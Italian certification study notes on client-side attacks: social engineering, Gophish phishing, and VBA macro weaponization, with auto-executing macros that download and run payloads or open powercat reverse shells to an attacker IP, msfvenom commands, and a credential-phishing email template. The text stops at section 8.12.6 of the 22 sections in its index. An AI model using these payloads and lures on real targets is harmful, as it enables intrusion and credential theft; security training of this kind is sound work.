---
title: "07 — Client-Side Attacks (Sintesi Consolidata)"
tags:
  - av-evasion
  - beef
  - browser
  - c2
  - client-side
  - credentials
  - empire
  - gophish
  - hta
  - lateral-movement
  - linux-privesc
  - macro
  - macropack
  - metasploit
  - msfvenom
  - mssql
  - nmap
  - nse
  - ntlm
  - obfuscation
  - pass-the-hash
  - phishing
  - pivoting
  - port-forwarding
  - rdp
  - scanning
  - shellter
  - smb
  - socks
  - sudo
---
# 07 — Client-Side Attacks (Sintesi Consolidata)

> **Modulo:** Client-Side Attacks · **Video coperti:** 26/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Scopo del file:** sintesi tematica rielaborata dell'intero modulo, pensata per ripasso veloce, cheat-sheet operativo e preparazione all'esame **eCPPT (formato 2024, 45 domande a risposta multipla in ambiente pratico)**.
> **Indice video sorgente:** vedi sezione finale "Mappa dei video".

---

## Indice

1. Cosa sono i client-side attacks
2. Attack vectors
3. Client-side information gathering & fingerprinting
4. Social Engineering — tipi e tassonomia
5. Pretexting — definizione, caratteristiche, pretext catalog
6. Phishing infrastructure — Gophish end-to-end
7. Resource Development & Weaponization
8. VBA Macros — fundamentals, development, weaponization
9. ActiveX Controls per macro execution
10. Pretexting di phishing documents
11. HTA (HTML Applications) e `mshta.exe`
12. MacroPack — automation e obfuscation
13. HTML Smuggling — delivery via Blob API
14. Lab end-to-end #1 — Spear phishing attachment + pivoting
15. Lab end-to-end #2 — Browser shell via BeEF
16. Cheat sheet `msfvenom` per client-side
17. Cheat sheet MacroPack — flag e template
18. Cheat sheet PowerShell switches per macro
19. Pretext catalog
20. Tabelle riassuntive e flussi d'attacco
21. Punti d'attenzione per l'esame eCPPT
22. Mappa dei video sorgente

---

## 1. Cosa sono i client-side attacks

### 1.1 Definizione
Un **client-side attack** è una tecnica che sfrutta vulnerabilità o misconfig del **software lato client** (browser, mail client, suite Office, lettori PDF) **oppure il comportamento umano** per ottenere **initial access** a un sistema o a una rete. Differisce dagli attacchi server-side perché:

- Il **target** è l'end-user device (laptop, desktop, smartphone) o l'employee stesso, non il server pubblico.
- È **sempre richiesta interazione utente**: download di un allegato, click su un link, accettazione di un prompt.
- Il traffico generato è **egress** (in uscita dalla rete del target verso l'attaccante) → spesso non bloccato dai firewall perimetrali.

### 1.2 Perché sono efficaci
1. **Wider attack surface** — desktop, laptop, smartphone e tablet sono ovunque, più numerosi e meno hardened dei server.
2. **Vulnerabilità umane** — curiosità, fiducia, paura di sbagliare, desiderio di approvazione (the **weakest link**).
3. **Security control deboli sui client** — soprattutto su device fuori dal perimetro (smart-working, BYOD).
4. **Pivoting opportunity** — un foothold sul laptop di un dipendente è la porta d'ingresso alla rete interna.
5. **Bypass del perimetro tecnico** — non serve un exploit zero-day pubblico: basta un'email e un payload.

### 1.3 Metodologia in 7 step (Adapted Client-Side Methodology)
Combina MITRE ATT&CK pre-attack tactics + Lockheed Cyber Kill Chain:

1. **Reconnaissance** — OSINT su sito, social, job posting; identifica employee e tech stack.
2. **Target Identification** — scelta dipartimenti più vulnerabili (HR, finance, executive).
3. **Resource Development** — sviluppo del payload (VBA macro, HTA, dropper PS, EXE Meterpreter).
4. **Weaponization** — embed del payload in `.docm`/`.doc`/`.hta`, obfuscation, AV evasion.
5. **Payload Delivery** — phishing email (Gophish), HTML smuggling, link, USB drop.
6. **Payload Execution / Initial Access** — la vittima abilita le macro o esegue il file → beacon C2.
7. **Post-Exploitation** — priv esc, lateral movement, persistence, exfiltration.

Mappa concettuale diretta su **MITRE ATT&CK** tactics: TA0043 Reconnaissance, **TA0042 Resource Development**, TA0001 Initial Access, TA0002 Execution, TA0003 Persistence, TA0004 Privilege Escalation, TA0008 Lateral Movement.

### 1.4 Client-Side vs Server-Side (tabella esame)

| Aspetto | Client-Side | Server-Side |
|---|---|---|
| Target | End-user device, browser, Office, employee behavior | Server, DB, web app, infrastruttura |
| Objective | Compromettere device + foothold rete | Accesso non autorizzato a server / data |
| Execution | Email, sito malevolo, doc infetto | Exploit di vulnerabilità su servizi pubblici |
| Esempi | Phishing, drive-by, malicious attachment, BeEF | SQLi, XSS, RCE, brute force |
| Direzione traffico | **Egress** (reverse shell) | **Ingress** (connect to server) |
| User interaction | **Sempre richiesta** | Tipicamente non richiesta |

---

## 2. Attack vectors

Un **attack vector** è il percorso/metodo usato per exploit di una vulnerabilità o weakness. I principali vettori client-side coperti dal corso sono:

### 2.1 Social Engineering
- **Phishing emails** — mail ingannevoli con allegato (`.doc`, `.zip`, `.iso`) o link malevolo.
- **Social media engineering** — fake profile (LinkedIn) per costruire fiducia, poi consegnare il payload.
- **Pretexting** — costruire un contesto credibile per legittimare la richiesta (trasversale a tutti i vettori).
- **Baiting** — sfrutta offerte/curiosità ("compensation package in this Excel").
- **Tailgating** — fisico: seguire un employee dentro l'ufficio.

### 2.2 Malicious Documents
Office (Word, Excel, PowerPoint) e PDF con macro VBA embedded o exploit. Vettore principale del corso: VBA macros in `.docm`, `.doc` (97-2003), `.xlsm`.

### 2.3 Drive-by Downloads
Hosting di payload / exploit kit / script su sito compromesso o malevolo. Quando l'utente visita → download automatico o prompt di "update".

### 2.4 Watering Hole
Compromesso di un sito **non social** frequentato dal target (es. portale di settore). Si inietta codice che colpisce solo i visitatori target. Complesso ma molto efficace per **APT**.

### 2.5 USB-based attacks
USB infette o **Rubber Ducky**. Cadute fuori dall'ufficio nella speranza che un employee le inserisca. Esegue automaticamente payload/script.

### 2.6 Exploit Kits e Browser Exploitation
- **Exploit Kits** (es. **BeEF**) — suite automatizzate per colpire vuln in browser, plugin (Flash, Java).
- **Browser exploitation** manuale — exploit di vuln in browser/plugin per RCE.

### 2.7 Tabella riassuntiva

| Vettore | Frequenza | Skill richiesto | Note |
|---|---|---|---|
| Phishing email + macro doc | Altissima | Bassa-media | Standard del corso |
| Spear phishing | Alta | Media | Targeted, recon profonda |
| Social media engineering | Alta | Media | Fake profile, long-game |
| Pretexting | Trasversale | Media-alta | Abilita tutti gli altri |
| Drive-by download | Media | Media | Sito + landing malevola |
| Watering hole | Bassa | Alta | Tipico APT |
| USB / Rubber Ducky | Media | Bassa | Richiede vicinanza fisica |
| Exploit kit (BeEF) | Media | Media | Browser hooking automatico |
| Browser exploitation CVE | Bassa | Alta | Manuale, RCE su browser |
| HTML smuggling | Crescente | Media | T1027.006 — APT-grade |

---

## 3. Client-Side Information Gathering & Fingerprinting

### 3.1 Perché serve
Senza sapere se l'employee usa Windows + Office 2016, oppure Mac + Pages, oppure ChromeOS, sviluppi payload a vuoto. Bisogna identificare:
- **Browser** (Chrome, Firefox, Edge, Brave, Safari) + versione.
- **OS** + versione + architettura (x86/x64).
- **Software installato** (Office version, Adobe Reader, mail client, AV).
- **Plugin/extensions** del browser.
- **Lingua, timezone, locale**.

### 3.2 Passive Client Information Gathering
Non interagisce con il target. Tecniche già coperte in eJPT:
- **OSINT**: LinkedIn, Twitter, GitHub, public forum.
- **Search Engine Recon**: Google Dorks, Shodan, Censys.
- **Email harvesting**: `theHarvester -d acme.com -b all`.
- **Tool**: Maltego per link analysis.

### 3.3 Active Client Information Gathering
Interazione (anche indiretta) con l'employee per estrarre info:
1. **Client Fingerprinting** — pagina web con JS che raccoglie User-Agent, plugin, screen, fonts.
2. **Social Engineering** — chiedere info "per compatibilità" via mail/telefono.
3. **Banner Grabbing client** — log delle risposte HTTP del browser.

### 3.4 Pretexting per recon — esempio canonico
**Macro che genera errore** come **canary** per confermare presenza di Office:
```vba
Sub Document_Open()
    Err.Raise 5  ' simula corruzione
End Sub
```
Flusso:
1. Alice (attaccante) crea persona "Sarah Johnson" e invia "CV.docm" all'HR.
2. HR prova ad aprire → errore → contatta Sarah dicendo "il doc non si apre".
3. Conferma implicita: **Office installato**.
4. Sarah follow-up: "potresti dirmi la versione di Word per assicurare compatibilità?"
5. HR risponde con versione → Alice ora sa la versione esatta → costruisce macro mirata (bypass security feature specifiche).

### 3.5 Client (Browser) Fingerprinting con JavaScript
Workflow completo:
1. **Setup Apache + FingerprintJS2** su Kali:
   ```bash
   sudo apt install apache2 -y
   sudo systemctl start apache2
   cd /var/www/html
   sudo git clone https://github.com/Valve/fingerprintjs2
   sudo chown -R www-data:www-data fingerprintjs2
   ```
2. Modifica `index.html` per pretesto credibile (es. "Construction Tips") + aggiungi `XMLHttpRequest` POST a `fp.php`.
3. `fp.php` salva i dati in `fingerprint.txt`:
   ```php
   <?php
   $data = "Client IP: " . $_SERVER['REMOTE_ADDR'] . "\n"
         . file_get_contents("php://input") . "\n\n";
   file_put_contents("/var/www/html/fingerprintjs2/fingerprint.txt",
                     $data, FILE_APPEND);
   ?>
   ```
4. Spedisci link via phishing → la vittima visita → log popolato.
5. Parse del User-Agent: `https://explore.whatismybrowser.com/useragents/parse/`.

### 3.6 Cosa estrae FingerprintJS2
- `User-Agent` (browser + OS).
- Language (`en-US`, `it-IT`).
- Screen resolution, color depth.
- Plugins, MIME types.
- Fonts, WebGL info.
- AdBlock detected (true/false).
- Touch support, timezone.

### 3.7 Limiti
- Browser privacy-focused (**Brave**) e estensioni (**NoScript**, **uBlock Origin**) possono bloccare JS.
- OS detection più affidabile su Windows/macOS che Linux.
- **BeEF** offre una versione più aggressiva (full hooking).

---



### Quiz: Concetti base, attack vectors e fingerprinting

<div class="ecppt-quiz" data-module="07_Client_Side_Attacks" data-block="0"></div>

## 4. Social Engineering — tipi e tassonomia

### 4.1 Definizione
**Social Engineering** = manipolazione di individui per ottenere accesso non autorizzato sfruttando **vulnerabilità della psicologia umana**. Bypassa i controlli tecnici colpendo direttamente l'employee. Termine coniato dall'industriale olandese **J.C. Van Marken (1894)**; nelle agenzie di intelligence si chiama **target development**.

### 4.2 Due categorie di azione
1. **Information disclosure** — far rivelare info ("quale versione di Word usate?").
2. **Performing actions** — far cliccare un link, scaricare allegato, fornire credenziali.

### 4.3 I 5 archetipi psicologici sfruttati (memorizzare)
1. **Desire to be helpful** — la gente vuole sentirsi utile.
2. **Tendency to trust** — specialmente in società occidentali ben organizzate.
3. **Desire for approval** — bisogno di apprezzamento.
4. **Fear of getting in trouble** — efficace con junior, meno con executive.
5. **Avoiding conflict/arguments** — gli employee evitano lo scontro.

### 4.4 Tipi di Social Engineering

| Tipo | Canale | Note |
|---|---|---|
| **Phishing** | Email mass | Wide net, non personalizzato |
| **Spear Phishing** | Email targeted | Personalizzato su individuo/gruppo |
| **Whaling** | Email su executive | Sottocaso di spear, target C-level |
| **Vishing** | Telefono / voce | Impersona entità legittime |
| **Smishing** | SMS | Es. Pegasus (NSO Group) |
| **Pretexting** | Trasversale | Crea narrativa credibile |
| **Baiting** | Incentivi | Free software, job offer |
| **Tailgating** | Fisico | Seguire dentro area restricted |

### 4.5 Phishing — i 5 step
1. **Planning & Reconnaissance** — recon employee, comm channels.
2. **Message Crafting** — mail credibile con urgency/fear.
3. **Delivery** — invio mass o targeted, bypass spam filter.
4. **Deception & Manipulation** — link/attachment malevolo.
5. **Exploitation** — payload eseguito → accesso.

### 4.6 Spear Phishing — cosa cambia
Solo le **prime 3 fasi** differiscono rispetto al phishing:
1. **Target Selection & Research** — recon estensiva su singolo target (ruolo, relazioni, interessi).
2. **Message Tailoring** — riferimenti a eventi/progetti/colleghi reali (es. "Mark mi ha mandato questa invoice").
3. **Delivery** — via mail, social, IM, eventualmente account spoofed/compromessi.

### 4.7 Social Media per la SE
- **Facebook/Instagram** → interessi personali.
- **LinkedIn** → ruoli, dipartimenti, colleghi, gerarchia.
- **Twitter/X** → opinioni, eventi.
- **Eventi pubblicizzati** → leva (stress, distrazione del target).

### 4.8 Phishing simulations
Aziende ingaggiano pen tester per campagne phishing **ricorrenti** (es. 6 all'anno) per misurare l'efficacia del security awareness training.

---

## 5. Pretexting — definizione, caratteristiche, pretext catalog

### 5.1 Definizione
**Pretexting** = creazione di un **falso scenario / narrativa** per guadagnare fiducia ed estrarre info o azioni. È **trasversale**: non è un tipo separato di SE ma una pratica che alimenta tutti gli altri (phishing, vishing, smishing, tailgating).

### 5.2 Le 5 caratteristiche del pretexting (memorizzare)
1. **False Pretense** — storia fittizia coerente (mail professionale, impersonazione autorevole).
2. **Establishing Trust** — rapporto via tono, linguaggio, professionalità (no "Nigerian Prince" obvious scam).
3. **Manipulating Emotion** — leve: curiosità, paura, urgenza, simpatia.
4. **Information Gathering** — dopo aver costruito trust, richiesta "naturale".
5. **Maintaining Consistency** — narrativa coerente per tutta l'interazione.

### 5.3 Pretext catalog (4-5 esempi del corso)

| # | Pretext | Audience target | Leva psicologica | File / canale |
|---|---|---|---|---|
| 1 | **Tech Support Scam** — "il tuo PC è infetto, dammi remote access" | All / non tecnici | Fear + urgency | Vishing, email |
| 2 | **Job Interview Scam (recruiter LinkedIn)** | HR, sviluppatori, marketing | Desire for approval, curiosità | `JD.docm` / `CV.docm` |
| 3 | **Emergency Situation — LastPass / data breach reset** | All employees | Fear + urgency | Link a credential harvesting page |
| 4 | **VPN issues / Office 365 webmail upgrade** | All (IT dept impersonation) | Fear of service disruption | Link a fake login portal |
| 5 | **Shipping / Invoice review** | Accounting, finance | Curiosità + senso di dovere | `Invoice_<NumeroXYZ>.xls` con macro |
| 6 | **HR policy / Salary review / Annual leave form** | All employees | Curiosità (salary) + obbligo | `Annual_Leave_Form_2024.doc` |
| 7 | **Contract draft / NDA** | Legal, management | Senso di urgenza professionale | `NDA_Draft_v2.doc` |

### 5.4 Risorsa di riferimento
**`github.com/L4bF0x/PhishingPretexts`** — libreria di template HTML pronti per offensive engagement, con variabili sostituibili (`{ORG_NAME}`, `{PHISHING_URL}`, `{SENDER}`).

### 5.5 Template canonico "Corporate IT Department Upgrade"
```text
Subject: New Webmail Office 365 Rollout

Dear Colleagues,

In an effort to continue to bring you the best available technology,
{ORG_NAME} has implemented the newest version of Microsoft Office Webmail.
Your existing emails, contacts and calendar events will be
seamlessly transferred to your new account.

Please visit {PHISHING_URL} and log in with your current
username and password to confirm your upgraded account.

If you have any additional questions, please contact the help desk.

Thank you,
IT Department
```
**Leve**: urgency (avoid service disruption) + fear (lose email access).

### 5.6 Pretexting nei phishing documents (video 018)
Due regole d'oro:
1. Il documento deve **sembrare legittimo** prima dell'enable (cover coerente col pretext).
2. Il documento deve **convincere ad abilitare le macro** con messaggio fake autorevole (Microsoft-styled), non un foglio bianco.

**Template "fake conversion notice"** — cover full-page con logo Word stilizzato e testo:
> *"This document was edited in an earlier version of Microsoft Word. To view this content, please click **Enable Editing** from the yellow bar, then click **Enable Content** to convert the document version."*

Sotto: contenuto vero (CV, fattura, contratto) **bianco su bianco** → invisibile fino all'enable. Riferimento: repo **`office-fish-templates`** su GitHub.

### 5.7 OPSEC dei documenti pretext
- **`.doc` (97-2003)** preferito a `.docm` → icona neutra, non rivela presenza macro.
- **Metadata coerente** col pretext: File → Info → Properties → Show All Properties → compilare **Author**, **Company**, **Title**.
- Attenzione al **MOTW (Mark-of-the-Web)**: file scaricati da Internet/Outlook attivano **Protected View** in Office → 2 click invece di 1. Mitigazione: consegna via SMB share, smuggling, ISO, USB.

---

## 6. Phishing infrastructure — Gophish end-to-end

### 6.1 Cos'è Gophish
Framework open source per **phishing simulation**, pensato per pen tester. Vantaggi vs SET (Social Engineering Toolkit):
- WYSIWYG email editor.
- Campaign management + multi-target.
- Landing page builder (clone portali login).
- Tracking real-time (opened, clicked, submitted, reported).
- Report generation per CISO/board.
- **Scheduling/automation** ricorrente (campagne annuali).

### 6.2 Architettura
- **Admin server** (default `https://127.0.0.1:3333`, TLS).
- **Phishing server** (default `http://0.0.0.0:80`).
- **DB SQLite** (`gophish.db`).

### 6.3 Deploy in produzione
1. **VPS** (AWS / Linode / DigitalOcean).
2. **Dominio** resolved a IP server.
3. **Mail relay**: AWS SES o Mailgun.
4. Configurare **SPF / DKIM / DMARC** del dominio attaccante (no spoof se target ha policy strict).

### 6.4 `config.json` essenziale
```json
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db"
}
```
Nel lab: settare `use_tls: false` su admin server per evitare warning cert. Login lab: `admin / phishingpassword`.

### 6.5 I 5 building block di una campagna Gophish (esame!)
1. **Sending Profile** (SMTP)
2. **Landing Page** (clone)
3. **Email Template** (corpo + allegato)
4. **Users & Groups** (CSV target)
5. **Campaign** (orchestrazione + scheduling)

### 6.6 Sending Profile
- **Name**: es. "Red Team".
- **Interface Type**: SMTP.
- **From**: `Info & Support <info@demo.ine.local>` (spoof se il dominio target non ha SPF/DKIM strict).
- **Host**: `localhost:25` (in lab) o `email-smtp.us-east-1.amazonaws.com:587` (SES).
- **Username/Password**: account su mail server (`red@demo.ine.local` / `penetrationtesting`).
- **Ignore Certificate Errors**: true (lab).
- **Send Test Email** prima del deploy.

### 6.7 Landing Page
- **Import Site**: scarica HTML del portale target (es. `http://localhost:8080`).
- Toggle **Capture Submitted Data** + **Capture Passwords** (opzionali, off di default per ragioni etico/legali).
- **Redirect to**: URL legittimo per non insospettire la vittima dopo submit (es. `https://target.com/login`).

### 6.8 Email Template
- **Subject**: es. "Password Reset Instructions".
- **Import Email**: incolla raw email/HTML (pretext da L4bF0x).
- **Add Tracking Image**: pixel di tracking (1×1) → misura "Opened".
- **Add Files**: allegati malevoli (`.docm`, `.doc`, `.hta`, archivio `.zip`/`.iso`).

### 6.9 Users & Groups (CSV)
```csv
First Name,Last Name,Email,Position
John,Smith,ceo@demo.ine.local,CEO
Jane,Doe,cfo@demo.ine.local,CFO
Mark,Roe,cmo@demo.ine.local,CMO
Sam,Intern,victim@demo.ine.local,Intern
```
Crea **gruppi separati per dipartimento** (HR, Accounting, IT) per segmentation.

### 6.10 Campaign
- Associa: Email Template, Landing Page, URL phish server, Sending Profile, Groups.
- **Launch Date** + opzionale **Send Emails By** (campagna distribuita nel tempo).
- Risultati real-time: **Email Sent → Opened → Clicked Link → Submitted Data → Reported**.
- **Export** risultati CSV per cliente.

### 6.11 Caveat lab offline
Il lab INE non ha internet → modifica `templates/base.html` e `login.html`:
- Rimuovi `<link rel="stylesheet">` a Google Fonts.
- Rimuovi JS CDN esterni.
- CSS locali (`static/css/gophish.css`) restano.

---



### Quiz: Social engineering, pretexting, Gophish

<div class="ecppt-quiz" data-module="07_Client_Side_Attacks" data-block="1"></div>

## 7. Resource Development & Weaponization

### 7.1 Definizioni
- **Resource Development** (MITRE ATT&CK TA0042) — acquisire/costruire risorse: tool, knowledge, infrastructure (domains, VPS), exploit code, custom scripts.
- **Weaponization** (Lockheed Cyber Kill Chain, fase 2) — **combinare exploit + backdoor in payload deliverable** (es. macro embedded in `.docm`, obfuscated, anti-AV).

Origine: terminologia militare adottata in cybersecurity.

### 7.2 MITRE ATT&CK in 1 minuto
- **A**dversarial **T**actics **T**echniques & **C**ommon **K**nowledge.
- Knowledge base globale di attacchi reali catalogati per **TTPs** (Tactics, Techniques, Procedures).
- Matrici: Enterprise (Windows, Linux, macOS, Cloud), Mobile, ICS.
- **Pre-attack tactics**: TA0043 Reconnaissance, **TA0042 Resource Development**.
- Esempio sub-technique: `T1583.003 Acquire Infrastructure: Virtual Private Server`.
- Pen tester usa MITRE per **adversary emulation** (simulare un APT specifico via TTP).

### 7.3 Cyber Kill Chain (Lockheed Martin) — 7 fasi
1. Reconnaissance
2. **Weaponization**
3. Delivery
4. Exploitation
5. Installation
6. Command & Control
7. Actions on Objectives

### 7.4 Differenze chiave Resource Dev vs Weaponization

| Aspetto | Resource Development | Weaponization |
|---|---|---|
| Focus | Acquisire tool/info/infrastructure | Trasformare in payload deliverable |
| Stage | Precede weaponization | Dopo resource dev |
| Attività | Recon tool, script dev, dominio, VPS | Crafting payload, obfuscation, AV evasion |
| Output | Tool/info raw | Payload pronto per delivery |
| Esempio | Scrivere una funzione VBA | Inserire la macro in `Invoice.docm` con metadata fake |

### 7.5 Esempio applicato
- **Recon**: target Acme Corp HR, Office 2016.
- **Resource Dev**: scrivi VBA dropper PowerShell + test su Office 2016 VM.
- **Weaponization**: embed in `Invoice.docm`, MacroPack obfuscation, MOTW removal, AMSI bypass.
- **Delivery**: Gophish, pretext "Invoice review".
- **Execution**: vittima apre → macro lancia PS dropper → reverse shell.

### 7.6 Mappatura TTP per macro phishing campaign
```text
Recon              -> T1589 Gather Victim Identity (employee emails)
Resource Dev       -> T1587 Develop Capabilities (custom macro)
                   -> T1583.001 Acquire Domain
                   -> T1583.003 Acquire VPS
Initial Access     -> T1566.001 Spearphishing Attachment
Execution          -> T1204.002 User Execution: Malicious File
Defense Evasion    -> T1027 Obfuscated Files
                   -> T1027.006 HTML Smuggling
```

---

## 8. VBA Macros — fundamentals, development, weaponization

### 8.1 Cos'è VBA
- **VBA = Visual Basic for Applications** — linguaggio di scripting Microsoft per automazione Office (Word, Excel, PowerPoint, Access, Outlook).
- IDE built-in in ogni Office app (Developer tab → Visual Basic, scorciatoia **`Alt+F11`**).
- Sintassi simile a Visual Basic / BASIC.
- Può chiamare **Windows API** + **WScript** (shell, run, env vars, registry) → potere quasi nativo.

### 8.2 Storia macro = arma
- Anni '90s: macro auto-eseguite → primi virus (Melissa).
- **Pre-2003**: auto-exec.
- **Office 2003**: prompt utente.
- **Office 2007+**: nuovi formati separati (`docx` no-macro vs `docm` macro-enabled).
- **Oggi**: utente deve cliccare **"Enable Content"** → social engineering critico.

### 8.3 Formati Office (memorizza per esame)

| Estensione | Macro? | Tipo |
|---|---|---|
| `.docx` | NO | Document standard |
| **`.docm`** | **SI** | Document macro-enabled |
| `.dotx` | NO | Template standard |
| **`.dotm`** | **SI** | Template macro-enabled |
| `.xlsx` / **`.xlsm`** | NO / **SI** | Excel |
| `.pptx` / **`.pptm`** | NO / **SI** | PowerPoint |
| **`.doc`** (97-2003) | **SI** | Legacy, **OPSEC-friendly** (icona neutra) |
| `.rtf` | NO by design | Ma `.docm` rinominato `.rtf` può eseguire (instabile su Office 2016) |

`wwlib.dll` valida la struttura Open Office XML — l'estensione non determina apertura/esecuzione. Rinominare `.docm` → `.docx` NON funziona.

### 8.4 WScript.⁠Shell — il vettore #1
```vba
CreateObject("WScript.⁠Shell").Run cmd, windowStyle, waitOnReturn
```
- **WScript** = Windows Script Host object model.
- `.Run("calc.exe", 0, False)` — esecuzione hidden + fire-and-forget.
- Permette anche `.RegRead(path)` e `.RegWrite path, value, type`.

**Window style values** (parametro `Run`):
| Value | Comportamento |
|---|---|
| **0** | **Hidden** (preferito per malware) |
| 1 | Normal (default) |
| 2 | Minimized |
| 3 | Maximized |
| 4 | Last position |

**waitOnReturn**: `True` aspetta che il processo termini, `False` fire-and-forget (preferito).

### 8.5 Eventi auto-execute (memorizzare)

| Evento | App | Quando |
|---|---|---|
| **`Document_Open()`** | Word ≥97 | All'apertura documento |
| **`AutoOpen()`** | Word legacy ≤97 | Retro-compatibilità |
| **`Workbook_Open()`** | Excel | All'apertura workbook |
| `Auto_Open()` | Excel | Legacy |
| `Document_Close()` / `AutoClose()` | Word | Alla chiusura |

**Best practice**: includere **sempre entrambe** `Document_Open` + `AutoOpen` per Word, e farle puntare alla stessa subroutine maliziosa.

### 8.6 Setup ambiente dev
1. Windows 10 + Office 2016 installato.
2. File → Options → Customize Ribbon → check **Developer**.
3. Trust Center Settings → Macro Settings:
   - Disable all macros with notification (default, yellow bar).
   - Trust access to VBA project object model ✓ (per testing).

### 8.7 Sintassi base VBA
```vba
Sub HelloWorld()
    ' commento singola linea
    MsgBox "Hello World", vbInformation, "Demo Title"
End Sub

' Variabili
Dim payload As String
payload = "calc.exe"

Dim ws As Worksheet
Set ws = ThisWorkbook.Sheets.Add  ' Set per oggetti
ws.Name = "Red Team Tracker"
```

### 8.8 Macro template combo per phishing
```vba
Sub AutoOpen()
    Payload
End Sub
Sub Document_Open()
    Payload
End Sub
Sub Payload()
    Dim cmd As String
    cmd = "calc.exe"   ' o qualsiasi LOLBin / PowerShell
    CreateObject("WScript.⁠Shell").Run cmd, 0, False
End Sub
```

### 8.9 Fingerprinting OS prima del payload via `RegRead`
```vba
Sub Document_Open()
    Dim WSH As Object, ver As String
    Set WSH = CreateObject("WScript.⁠Shell")
    ver = WSH.RegRead("HKLM\Software\Microsoft\Windows NT\CurrentVersion\ProductName")
    If InStr(ver, "Windows 10") > 0 Then Payload
End Sub
```

### 8.10 Weaponization VBA con Metasploit (`msfvenom`)
Formati VBA disponibili:
- **`vba`** — codice macro nativo MSF + hex payload (legacy, meno affidabile).
- **`vba-exe`** — codice macro + hex payload da appendere **nel body del documento** (più affidabile).
- **`vba-psh`** — macro che invoca PowerShell con payload base64 (più pulita, niente hex).

#### 8.10.1 Generazione `vba-exe`
```bash
msfvenom -a x86 --platform windows \
  -p windows/meter⁠preter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f vba-exe
```
Output composto da:
1. **Sezione MACRO** — codice VBA da copiare nel VBA IDE.
2. **Sezione PAYLOAD DATA** — blob hex da **incollare nel corpo del documento Word** (la macro lo legge a runtime).

#### 8.10.2 Generazione `vba-psh` (raccomandato)
```bash
msfvenom -p windows/meter⁠preter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f vba-psh
```
Macro che invoca PowerShell con base64-encoded payload → Meterpreter in-memory. **Niente hex** da appendere.

#### 8.10.3 Adattamento Word vs Excel
`vba-exe` di default genera `Sub Workbook_Open()` (Excel) → per **Word** rinominare in `Sub Document_Open()` + aggiungere `AutoOpen()`.

#### 8.10.4 Handler
```text
use exploit/multi/handler
set PAYLOAD windows/meter⁠preter/reverse_tcp
set LHOST 192.168.2.134
set LPORT 4444
run
```

#### 8.10.5 Encoding aggiuntivo
```bash
msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=… LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f vba-psh
```
Aggiunge layer di encoding → meno detection signature-based (NON evade EDR/behavior).

### 8.11 VBA PowerShell Dropper (video 015)
**Dropper** = documento/payload che NON dà accesso iniziale di per sé, ma **scarica ed esegue** un secondo stadio (vero implant).

Vantaggi:
- Codice macro più piccolo/innocuo → bypass signature scanning.
- Payload reale non scritto nel doc → cambiabile server-side senza rigenerare il doc.

#### 8.11.1 Setup Kali
```bash
# Genera l'implant
msfvenom -p windows/meter⁠preter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 -f exe -o shell.exe
# Hosting HTTP
python3 -m http.server 8080
```

#### 8.11.2 Macro dropper completa
```vba
Sub AutoOpen()
    Dropper
End Sub
Sub Document_Open()
    Dropper
End Sub

Sub Dropper()
    Dim url As String
    url = "http://192.168.2.134:8080/shell.exe"

    Dim PSScript As String
    PSScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\admin\file.exe""" & vbCrLf & _
               "Start-Process -FilePath ""C:\Users\admin\file.exe"""

    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & PSScript & """", vbHide
End Sub
```

#### 8.11.3 Triple quote `"""` — la regola
In VBA, dentro una stringa, per ottenere un singolo `"` devi raddoppiarlo (`""`). Quando la stringa che stai costruendo deve **già contenere virgolette** e contiene anche interpolazione con `&`, finisci per scrivere `"""` (= un `"` letterale + chiusura/riapertura della string literal).

#### 8.11.4 Costanti utili
- **`vbCrLf`** = `Chr(13) & Chr(10)`. Newline per separare comandi PowerShell multipli in unico `-Command`.
- **`vbHide`** = 0 (windowStyle nascosto in `Shell`).
- **`vbNormalFocus`** = 1, **`vbMinimizedFocus`** = 2, ...

#### 8.11.5 Versione minimal IEX
```vba
Sub Document_Open()
    Dim p As String
    p = "I⁠EX (New-Object Net.Web⁠Client).Download⁠String('http://10.0.0.5/i.ps1')"
    Shell "powershell -nop -w hidden -ep bypass -c """ & p & """", vbHide
End Sub
```

### 8.12 VBA Reverse Shell con Powercat (video 016)
**Powercat** = porting PowerShell di Netcat (autore Besimorhino). Singolo file `powercat.ps1`, è una **funzione** PowerShell da loadare prima dell'uso.

#### 8.12.1 Setup Kali
```bash
cd ~/Desktop
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
```

#### 8.12.2 Macro reverse shell in-memory
```vba
Sub Document_Open()
    PowerCatShell
End Sub
Sub AutoOpen()
    PowerCatShell
End Sub

Sub PowerCatShell()
    Dim url As String
    url = "http://192.168.2.134:8080/powercat.ps1"

    Dim PS As String
    PS = "I⁠EX (New-Object System.Net.Web⁠Client).Download⁠String('" & url & "');" & _
         "powercat -c 192.168.2.134 -p 1337 -e cmd"

    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & PS & """", vbHide
End Sub
```
- **`IEX`** (Invoke-Expres⁠sion) esegue lo script scaricato **direttamente in memoria** → niente file su disco.
- **`powercat -c <ip> -p <port> -e cmd`** = client mode, connect-back, binda `cmd.exe` al socket.

#### 8.12.3 Listener
```bash
nc -nvlp 1337
```

#### 8.12.4 Variante encoded (più stealth)
Su Kali:
```bash
pwsh
I⁠EX (New-Object System.Net.Web⁠Client).Download⁠String('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -l -p 1337 -e cmd -ge > /tmp/reverse_shell.txt
# -ge = generate encoded payload
```
Hosting:
```bash
cd /tmp && python3 -m http.server 8080
```

#### 8.12.5 Vantaggi vs dropper EXE
| Aspetto | Dropper EXE | Powercat in-memory |
|---|---|---|
| File su disco | Sì (`.exe`) | No (solo `.ps1` scaricato in RAM) |
| Detection AV | Alta (hash exe) | Bassa (PS in memory) |
| Dipendenza | nessuna | PowerShell + outbound HTTP |
| Handler | `multi/handler` | `nc` semplice |
| Footprint forense | exe + log filesystem | solo network + PS history |

#### 8.12.6 Powercat supporta anche `-dns`
